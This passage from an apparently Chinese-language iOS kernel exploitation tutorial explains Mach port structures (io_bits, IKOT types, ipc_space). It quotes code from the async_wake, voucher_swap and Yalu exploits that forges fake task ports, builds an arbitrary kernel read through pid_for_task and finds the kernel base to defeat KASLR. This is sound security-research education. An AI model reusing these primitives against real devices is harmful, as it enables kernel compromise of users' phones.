ipc_port.h.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IO_BITS_PORT_INFO	0x0000f000	<span class="comment">/* stupid port tricks */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IO_BITS_KOTYPE		0x00000fff	<span class="comment">/* used by the object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IO_BITS_OTYPE		0x7fff0000	<span class="comment">/* determines a zone */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IO_BITS_ACTIVE		0x80000000	<span class="comment">/* is object alive? */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	io_active(io)		(((io)-&gt;io_bits &amp; IO_BITS_ACTIVE) != 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	io_otype(io)		(((io)-&gt;io_bits &amp; IO_BITS_OTYPE) &gt;&gt; 16)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	io_kotype(io)		((io)-&gt;io_bits &amp; IO_BITS_KOTYPE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	io_makebits(active, otype, kotype)	\</span></span><br><span class="line"><span class="meta">	(((active) ? IO_BITS_ACTIVE : 0) | ((otype) &lt;&lt; 16) | (kotype))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Object types: ports, port sets, kernel-loaded ports</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IOT_PORT		0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOT_PORT_SET		1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOT_NUMBER		2		<span class="comment">/* number of types used */</span></span></span><br></pre></td></tr></table></figure>

<p>需要设置IO_BITS_ACTIVE以确保该对象存活。IO_BITS_OTYPE指定对象类型。IO_BITS_KOTYPE指定端口类型，是一个任务端口或时钟端口等。创建伪造的端口时需要在io_bits中指定这些值。完整列表可以在<code>BUILD/obj/EXPORT_HDRS/osfmk/kern/ipc_kobject.h</code>中找到。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">092</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_NONE               0</span></span><br><span class="line"><span class="number">093</span>: <span class="meta">#<span class="keyword">define</span> IKOT_THREAD                1</span></span><br><span class="line"><span class="number">094</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_TASK               2</span></span><br><span class="line"><span class="number">095</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_HOST               3</span></span><br><span class="line"><span class="number">096</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_HOST_PRIV          4</span></span><br><span class="line"><span class="number">097</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_PROCESSOR          5</span></span><br><span class="line"><span class="number">098</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_PSET               6</span></span><br><span class="line"><span class="number">099</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_PSET_NAME          7</span></span><br><span class="line"><span class="number">100</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_TIMER              8</span></span><br><span class="line"><span class="number">101</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_PAGING_REQUEST     9</span></span><br><span class="line"><span class="number">102</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_MIG                10</span></span><br><span class="line"><span class="number">103</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_MEMORY_OBJECT      11</span></span><br><span class="line"><span class="number">104</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_XMM_PAGER          12</span></span><br><span class="line"><span class="number">105</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_XMM_KERNEL         13</span></span><br><span class="line"><span class="number">106</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_XMM_REPLY          14</span></span><br><span class="line"><span class="number">107</span>: <span class="meta">#<span class="keyword">define</span> IKOT_UND_REPLY         15</span></span><br><span class="line"><span class="number">108</span>: <span class="meta">#<span class="keyword">define</span> IKOT_HOST_NOTIFY       16</span></span><br><span class="line"><span class="number">109</span>: <span class="meta">#<span class="keyword">define</span> IKOT_HOST_SECURITY     17</span></span><br><span class="line"><span class="number">110</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_LEDGER             18</span></span><br><span class="line"><span class="number">111</span>: <span class="meta">#<span class="keyword">define</span> IKOT_MASTER_DEVICE     19</span></span><br><span class="line"><span class="number">112</span>: <span class="meta">#<span class="keyword">define</span> IKOT_TASK_NAME         20</span></span><br><span class="line"><span class="number">113</span>: <span class="meta">#<span class="keyword">define</span> IKOT_SUBSYSTEM         21</span></span><br><span class="line"><span class="number">114</span>: <span class="meta">#<span class="keyword">define</span> IKOT_IO_DONE_QUEUE     22</span></span><br><span class="line"><span class="number">115</span>: <span class="meta">#<span class="keyword">define</span> IKOT_SEMAPHORE         23</span></span><br><span class="line"><span class="number">116</span>: <span class="meta">#<span class="keyword">define</span> IKOT_LOCK_SET          24</span></span><br><span class="line"><span class="number">117</span>: <span class="meta">#<span class="keyword">define</span> IKOT_CLOCK             25</span></span><br><span class="line"><span class="number">118</span>: <span class="meta">#<span class="keyword">define</span> IKOT_CLOCK_CTRL            26</span></span><br><span class="line"><span class="number">119</span>: <span class="meta">#<span class="keyword">define</span> IKOT_IOKIT_IDENT       27</span></span><br><span class="line"><span class="number">120</span>: <span class="meta">#<span class="keyword">define</span> IKOT_NAMED_ENTRY       28</span></span><br><span class="line"><span class="number">121</span>: <span class="meta">#<span class="keyword">define</span> IKOT_IOKIT_CONNECT     29</span></span><br><span class="line"><span class="number">122</span>: <span class="meta">#<span class="keyword">define</span> IKOT_IOKIT_OBJECT      30</span></span><br><span class="line"><span class="number">123</span>: <span class="meta">#<span class="keyword">define</span> IKOT_UPL               31</span></span><br><span class="line"><span class="number">124</span>: <span class="meta">#<span class="keyword">define</span> IKOT_MEM_OBJ_CONTROL       32</span></span><br><span class="line"><span class="number">125</span>: <span class="meta">#<span class="keyword">define</span> IKOT_AU_SESSIONPORT        33</span></span><br><span class="line"><span class="number">126</span>: <span class="meta">#<span class="keyword">define</span> IKOT_FILEPORT          34</span></span><br><span class="line"><span class="number">127</span>: <span class="meta">#<span class="keyword">define</span> IKOT_LABELH            35</span></span><br><span class="line"><span class="number">128</span>: <span class="meta">#<span class="keyword">define</span> IKOT_TASK_RESUME       36</span></span><br><span class="line"><span class="number">129</span>: <span class="meta">#<span class="keyword">define</span> IKOT_VOUCHER           37</span></span><br><span class="line"><span class="number">130</span>: <span class="meta">#<span class="keyword">define</span> IKOT_VOUCHER_ATTR_CONTROL  38</span></span><br><span class="line"><span class="number">131</span>: <span class="meta">#<span class="keyword">define</span> IKOT_WORK_INTERVAL              39</span></span><br><span class="line"><span class="number">132</span>: <span class="meta">#<span class="keyword">define</span> IKOT_UX_HANDLER                 40</span></span><br><span class="line"><span class="number">133</span>: </span><br><span class="line"><span class="number">134</span>: <span class="comment">/*</span></span><br><span class="line"><span class="comment">135:  * Add new entries here and adjust IKOT_UNKNOWN.</span></span><br><span class="line"><span class="comment">136:  * Please keep ipc/ipc_object.c:ikot_print_array up to date.</span></span><br><span class="line"><span class="comment">137:  */</span></span><br><span class="line"><span class="number">138</span>: <span class="meta">#<span class="keyword">define</span> IKOT_UNKNOWN                    41      <span class="comment">/* magic catchall       */</span></span></span><br><span class="line"><span class="number">139</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_MAX_TYPE   (IKOT_UNKNOWN+1)    <span class="comment">/* # of IKOT_ types */</span></span></span><br><span class="line"><span class="number">140</span>: </span><br><span class="line"><span class="number">141</span>: </span><br><span class="line"><span class="number">142</span>: <span class="meta">#<span class="keyword">define</span> is_ipc_kobject(ikot)   ((ikot) != IKOT_NONE)</span></span><br></pre></td></tr></table></figure>

<p>设置端口的io_bits示例代码如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IO_BITS_ACTIVE 0x80000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IKOT_TASK 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IKOT_CLOCK 25</span></span><br><span class="line"></span><br><span class="line">fakeport-&gt;io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;</span><br><span class="line">secondfakeport-&gt;io_bits = IKOT_TASK|IO_BITS_ACTIVE;</span><br></pre></td></tr></table></figure>

<p>ipc_object的io_references也需要被设置为不为0的值确保该对象不释放。</p>
<p>回到端口结构体，另一个重要成员是<code>struct ipc_space * receiver</code>，它指向ipc_space结构体。任务的ipc_space结构体定义其IPC功能。每个IPC功能都由一个ipc_entry表示，并放在一个表中，ipc_space结构体中的is_table指向该表。is_table中的端口权限或功能为16位，其名称实际上是is_table的索引。重要的是注意在内核中，端口权限(mach_port_t)通过传递指向适当的端口数据结构体(ipc_port_t)的指针来表示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_space</span> &#123;</span></span><br><span class="line">	<span class="type">lck_spin_t</span>	is_lock_data;</span><br><span class="line">	<span class="type">ipc_space_refs_t</span> is_bits;	<span class="comment">/* holds refs, active, growing */</span></span><br><span class="line">	<span class="type">ipc_entry_num_t</span> is_table_size;	<span class="comment">/* current size of table */</span></span><br><span class="line">	<span class="type">ipc_entry_num_t</span> is_table_free;	<span class="comment">/* count of free elements */</span></span><br><span class="line">	<span class="type">ipc_entry_t</span> is_table;		<span class="comment">/* an array of entries */</span></span><br><span class="line">	<span class="type">task_t</span> is_task;                 <span class="comment">/* associated task */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_table_size</span> *<span class="title">is_table_next</span>;</span> <span class="comment">/* info for larger table */</span></span><br><span class="line">	<span class="type">ipc_entry_num_t</span> is_low_mod;	<span class="comment">/* lowest modified entry during growth */</span></span><br><span class="line">	<span class="type">ipc_entry_num_t</span> is_high_mod;	<span class="comment">/* highest modified entry during growth */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bool_gen</span> <span class="title">bool_gen</span>;</span>       <span class="comment">/* state for boolean RNG */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> is_entropy[IS_ENTROPY_CNT]; <span class="comment">/* pool of entropy taken from RNG */</span></span><br><span class="line">	<span class="type">int</span> is_node_id;			<span class="comment">/* HOST_LOCAL_NODE, or remote node if proxy space */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>ipc_space是非常重要的结构体</strong>，因此，大多数EXP程序都会寻找内核ipc_space以便获得适当的(但仍为假的)内核任务端口。方法是将ipc_space_kernel复制到新的内存，并使假的端口的receiver指向该内存。</p>
<p>根据io_bits中设置的kobject类型，kobject指向不同的数据结构。因此如果伪造任务端口则需要将kobject指向struct task，如果是时钟，则指向struct clock。</p>
<p>async_wake EXP中相关的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span>* <span class="title function_">build_message_payload</span><span class="params">(<span class="type">uint64_t</span> dangling_port_address, <span class="type">uint32_t</span> message_body_size, <span class="type">uint32_t</span> message_body_offset, <span class="type">uint64_t</span> vm_map, <span class="type">uint64_t</span> receiver, <span class="type">uint64_t</span>** context_ptr)</span> &#123;</span><br><span class="line">  <span class="type">uint8_t</span>* body = <span class="built_in">malloc</span>(message_body_size);</span><br><span class="line">  <span class="built_in">memset</span>(body, <span class="number">0</span>, message_body_size);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> port_page_offset = dangling_port_address &amp; <span class="number">0xfff</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// structure required for the first fake port:</span></span><br><span class="line">  <span class="type">uint8_t</span>* fake_port = body + (port_page_offset - message_body_offset);</span><br><span class="line"></span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK;</span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = <span class="number">0xf00d</span>; <span class="comment">// leak references</span></span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = <span class="number">0xf00d</span>; <span class="comment">// leak srights</span></span><br><span class="line">  *(<span class="type">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver;</span><br><span class="line">  *(<span class="type">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = <span class="number">0x123456789abcdef</span>;</span><br><span class="line"></span><br><span class="line">  *context_ptr = (<span class="type">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the kobject pointer such that task-&gt;bsd_info reads from ip_context:</span></span><br><span class="line">  <span class="type">int</span> fake_task_offset = koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT) - koffset(KSTRUCT_OFFSET_TASK_BSD_INFO);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> fake_task_address = dangling_port_address + fake_task_offset;</span><br><span class="line">  *(<span class="type">uint64_t</span>*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_address;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// when we looked for a port to make dangling we made sure it was correctly positioned on the page such that when we set the fake task</span></span><br><span class="line">  <span class="comment">// pointer up there it&#x27;s actually all in the buffer so we can also set the reference count to leak it, let&#x27;s double check that!</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fake_port + fake_task_offset &lt; body) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the maths is wrong somewhere, fake task doesn&#x27;t fit in message\n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span>* fake_task = fake_port + fake_task_offset;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the ref_count field of the fake task:</span></span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = <span class="number">0xd00d</span>; <span class="comment">// leak references</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// make sure the task is active</span></span><br><span class="line">  *(<span class="type">uint32_t</span>*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the vm_map of the fake task:</span></span><br><span class="line">  *(<span class="type">uint64_t</span>*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the task lock type of the fake task&#x27;s lock:</span></span><br><span class="line">  *(<span class="type">uint8_t</span>*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = <span class="number">0x22</span>;</span><br><span class="line">  <span class="keyword">return</span> body;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>拓展知识：<a target="_blank" rel="noopener" href="https://papers.put.as/papers/ios/2017/cansecwest2017stefanesserportaltotheioscore.pdf">CanSecWest 2017 - Port(al) to the iOS Core</a></p>
</blockquote>
<h3 id="pid-for-task-任意读取"><a href="#pid-for-task-任意读取" class="headerlink" title="pid_for_task()任意读取"></a>pid_for_task()任意读取</h3><p>如前所述，pid_for_task()将给出相应任务的PID。假设p_pid的偏移量为0x10，并且假设要读取的地址为addr，则可以创建一个伪造端口，然后将其关联到假的任务，使得该任务中的bsd_info为addr-0x10。</p>
<p>下面是voucher_swap EXP中相关的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stage1_read32</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *  Read a 32-bit value from kernel memory using our fake port.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  This primitive requires that we know the address of the pipe buffer containing our port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span></span><br><span class="line"><span class="title function_">stage1_read32</span><span class="params">(<span class="type">uint64_t</span> address)</span> &#123;</span><br><span class="line">  <span class="comment">// Do a read to make the pipe available for a write.</span></span><br><span class="line">  read_pipe();</span><br><span class="line">  <span class="comment">// Create our fake task. The task&#x27;s proc&#x27;s p_pid field overlaps with the address we want to</span></span><br><span class="line">  <span class="comment">// read.</span></span><br><span class="line">  <span class="type">uint64_t</span> fake_proc_address = address - OFFSET(proc, p_pid);</span><br><span class="line">  <span class="type">uint64_t</span> fake_task_address = pipe_buffer_address + fake_task_offset;</span><br><span class="line">  <span class="type">uint8_t</span> *fake_task = (<span class="type">uint8_t</span> *) pipe_buffer + fake_task_offset;</span><br><span class="line">  FIELD(fake_task, task, ref_count, <span class="type">uint64_t</span>) = <span class="number">2</span>;</span><br><span class="line">  FIELD(fake_task, task, bsd_info,  <span class="type">uint64_t</span>) = fake_proc_address;</span><br><span class="line">  <span class="comment">// Initialize the port as a fake task port pointing to our fake task.</span></span><br><span class="line">  <span class="type">uint8_t</span> *fake_port_data = (<span class="type">uint8_t</span> *) pipe_buffer + fake_port_offset;</span><br><span class="line">  FIELD(fake_port_data, ipc_port, ip_bits,    <span class="type">uint32_t</span>) = io_makebits(<span class="number">1</span>, IOT_PORT, IKOT_TASK);</span><br><span class="line">  FIELD(fake_port_data, ipc_port, ip_kobject, <span class="type">uint64_t</span>) = fake_task_address;</span><br><span class="line">  <span class="comment">// Write our buffer to kernel memory.</span></span><br><span class="line">  write_pipe();</span><br><span class="line">  <span class="comment">// Now use pid_for_task() to read our value.</span></span><br><span class="line">  <span class="type">int</span> pid = <span class="number">-1</span>;</span><br><span class="line">  <span class="type">kern_return_t</span> kr = pid_for_task(fake_port, &amp;pid);</span><br><span class="line">  <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">    ERROR(<span class="string">&quot;%s returned %d: %s&quot;</span>, <span class="string">&quot;pid_for_task&quot;</span>, kr, mach_error_string(kr));</span><br><span class="line">    ERROR(<span class="string">&quot;could not read kernel memory in stage %d using %s&quot;</span>, <span class="number">1</span>, <span class="string">&quot;pid_for_task&quot;</span>);</span><br><span class="line">    fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">uint32_t</span>) pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用两次就可以读取64bit：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stage1_read64</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *  Read a 64-bit value from kernel memory using our stage 1 read primitive.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span></span><br><span class="line"><span class="title function_">stage1_read64</span><span class="params">(<span class="type">uint64_t</span> address)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> value32[<span class="number">2</span>];</span><br><span class="line">    <span class="type">uint64_t</span> value64;</span><br><span class="line">  &#125; u;</span><br><span class="line">  u.value32[<span class="number">0</span>] = stage1_read32(address);</span><br><span class="line">  u.value32[<span class="number">1</span>] = stage1_read32(address + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> u.value64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意偏移量会随着iOS版本以及设备的不同而变化。这些偏移量既可以通过查看内核源代码来找到，也可以通过查看kernelcache文件来找到。</p>
<p>此技术非常强大，可一次读取4个字节的内核内存。还可以用该函数找到内核偏移。需要做的仅仅是每次向后读取四个字节的内核内存，直到获得魔术值0xfeedfacf为止。该地址是内核基地址，减去用IDA或Hopper打开kernelcache时的起始地址就得到了偏移量。</p>
<p>下面是Yalu EXP中相关的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int32_t</span> leaked = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// The offset from the start of &quot;struct task&quot; to &quot;task-&gt;bsd_info&quot; seems to be fixed to 0x360, but this is prone to change anytime in the future as apple sees fit</span></span><br><span class="line">        <span class="comment">// It&#x27;d be nice to use a heuristic method like how K33n Team does it with the cpu_clock thing</span></span><br><span class="line">        *(<span class="type">uint64_t</span>*) (faketask + procoff) = leaked_ptr - <span class="number">0x10</span>;</span><br><span class="line">        <span class="comment">// This tries to read a value from &quot;task-&gt;bsd_info-&gt;p_pid&quot; which translates to &quot;faketask-&gt;bsd_info-&gt;p_pid = (leaked_ptr - 0x10)-&gt;p_pid = leaked_ptr&quot;</span></span><br><span class="line">        pid_for_task(foundport, &amp;leaked);</span><br><span class="line">        <span class="comment">// Is it 0xfeedfacf?</span></span><br><span class="line">        <span class="keyword">if</span> (leaked == MH_MAGIC_64) &#123;</span><br><span class="line">            NSLog(@<span class="string">&quot;found kernel text at %llx&quot;</span>, leaked_ptr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Retreat one page and search again</span></span><br><span class="line">        leaked_ptr -= <span class="number">0x4000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// Found kernel base!</span></span><br><span class="line"><span class="type">uint64_t</span> kernel_base = leaked_ptr;</span><br><span class="line">.....................</span><br><span class="line">.....................</span><br><span class="line"><span class="comment">// Calculating KASLR slide</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint64_t</span> slide;</span><br><span class="line">slide = kernel_base - <span class="number">0xFFFFFFF007004000</span>;</span><br></pre></td></tr></table></figure>

<p>获得了内核基地址就可以在内核内存中找到一些重要的结构体，例如<code>extern struct proclist allproc;</code>。可以在<code>/bsd/sys/proc_internal.h</code>中找到它。即使存在KASLR，它相对内核基地址的偏移总是固定的。正如我们从内核代码中看到的那样，该结构体包含进程的列表。也可以使用<code>jtool2 –analyze</code>命令找到符号地址，因为Apple错误地发布了含有符号的kernelcache。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">lck_grp_attr_t</span> * proc_lck_grp_attr;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">lck_attr_t</span> * proc_lck_attr;</span><br><span class="line"></span><br><span class="line">LIST_HEAD(proclist, proc);</span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">proclist</span> <span class="title">allproc</span>;</span>		<span class="comment">/* List of all processes. */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">proclist</span> <span class="title">zombproc</span>;</span>	<span class="comment">/* List of zombie processes. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">initproc</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span>	<span class="title function_">procinit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_lock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_unlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_spinlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_spinunlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_list_lock</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_list_unlock</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title 